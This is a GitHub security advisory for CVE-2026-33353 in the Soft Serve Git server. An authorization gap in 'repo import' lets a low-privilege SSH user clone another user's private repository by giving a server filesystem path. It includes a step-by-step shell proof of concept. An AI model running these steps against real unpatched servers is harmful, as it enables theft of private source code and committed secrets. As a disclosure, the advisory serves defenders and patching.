# [H] In Soft Serve, an authenticated repo import can clone server-local private repositories

## Summary
Severity: High
Advisory: GHSA-xgxp-f695-6vrp
CVE: CVE-2026-33353
CWE: CWE-200, CWE-862
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-xgxp-f695-6vrp
Type: github-advisory

## Affected
- Go: `github.com/charmbracelet/soft-serve` — affected >=0.6.0 <0.11.6

## Details
### Summary
An authorization flaw in `repo import` allows any authenticated SSH user to clone a server-local Git repository, including another user's private repo, into a new repository they control. This breaks the private-repository confidentiality boundary and should be treated as High severity.

### Details
Repo import checks authorization only for the destination repository name, not for the source remote. The destination-side authorization comes from [`pkg/ssh/cmd/cmd.go:172`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/ssh/cmd/cmd.go#L172), which calls [`pkg/backend/user.go:46`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/backend/user.go#L46). If the destination repo does not already exist, any authenticated user is granted `ReadWriteAccess` at [`pkg/backend/user.go:94`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/backend/user.go#L94).

The import command then passes the user-controlled `REMOTE` into [`pkg/backend/repo.go:102`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/backend/repo.go#L102). In vulnerable `HEAD`, `git.Clone(remote, rp, copts)` is reached without validating that `remote` is actually a network remote. As a result, a user can supply a server filesystem path such as `$DATA_PATH/repos/secret.git` and cause the server to clone its own local bare repository into a new repo owned by the attacker.

The relevant vulnerable flow is:
- [`pkg/ssh/cmd/import.go`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/ssh/cmd/import.go)
- [`pkg/ssh/cmd/cmd.go:172`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/ssh/cmd/cmd.go#L172)
- [`pkg/backend/user.go:94`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/backend/user.go#L94)
- [`pkg/backend/repo.go:102`](https://github.com/charmbracelet/soft-serve/blob/main/pkg/backend/repo.go#L102)

### PoC
Configuration:
- Default local test configuration is sufficient.
- SSH must be enabled.
- At least two users are needed: one owner/admin and one low-privilege authenticated user.

Reproduction steps:
1. Start Soft Serve.
2. As an admin, create a private repo:

```sh
soft repo create secret -p
```

3. Create a second low-privilege user:

```sh
soft user create user1 --key "$USER1_AUTHORIZED_KEY"
```

4. Seed the private repo with secret content:

```sh
git clone ssh://localhost:$SSH_PORT/secret secret
echo 'top secret' > secret/SECRET.txt
git -C secret add SECRET.txt
git -C secret commit -m 'first'
git -C secret push origin HEAD
```

5. Confirm the low-privilege user cannot access the private repo directly:

```sh
usoft repo info secret
```

Expected result:

```text
Error: repository not found
```

6. As the low-privilege user, import the server-local bare repo path into a new repo:

```sh
usoft repo import stolen "$DATA_PATH/repos/secret.git" --lfs-endpoint http://example.com
```

7. Clone the attacker-controlled imported repo and read the secret:

```sh
ugit clone ssh://localhost:$SSH_PORT/stolen stolen-clone
cat stolen-clone/SECRET.txt
```

Expected result:

```text
top secret
```

Notes:
- The `--lfs-endpoint` value is needed to avoid later LFS endpoint handling rejecting the local-path import.

### Impact
This is an authorization bypass and confidentiality issue.

Any authenticated SSH user on a multi-user Soft Serve instance can duplicate server-local Git repositories into new repositories they own, even when they are not a collaborator and direct access to the original private repo is denied. The primary impact is unauthorized disclosure of private source code and any secrets committed to those repositories.

Impacted parties:
- Operators hosting Soft Serve for multiple users or teams
- Owners of private repositories on the same instance
- Any deployment where untrusted authenticated users can use `repo import`

Practical impact:
- Theft of private source code
- Disclosure of secrets committed to private repos
- Exposure of unreleased or internal projects
- Possible follow-on supply-chain risk if stolen code contains credentials or release material

## References
- https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-xgxp-f695-6vrp
- https://nvd.nist.gov/vuln/detail/CVE-2026-33353
- https://github.com/charmbracelet/soft-serve/commit/c147421caf234bcfc1570c79d728ecbbe5813e55
- https://github.com/charmbracelet/soft-serve
- https://github.com/charmbracelet/soft-serve/releases/tag/v0.11.6
